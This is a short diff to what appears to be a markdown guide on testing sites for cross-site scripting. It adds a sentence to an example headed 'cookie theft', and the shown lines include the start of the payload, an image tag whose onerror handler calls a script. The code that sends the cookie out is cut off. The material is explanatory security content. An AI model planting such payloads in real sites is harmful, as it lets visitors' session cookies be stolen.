@@ -66,6 +66,8 @@ From all the website submits, test with HTML chars (html entities), and look the
 ---
 ## Examples     
 ### Example 1 : cookie theft 
+This code will send the cookie of the user who visit the website containing this payload. 
+
 ```
     <img src="nonExistImg" onerror="myFunction()"/>
     <script>function myFunction(){
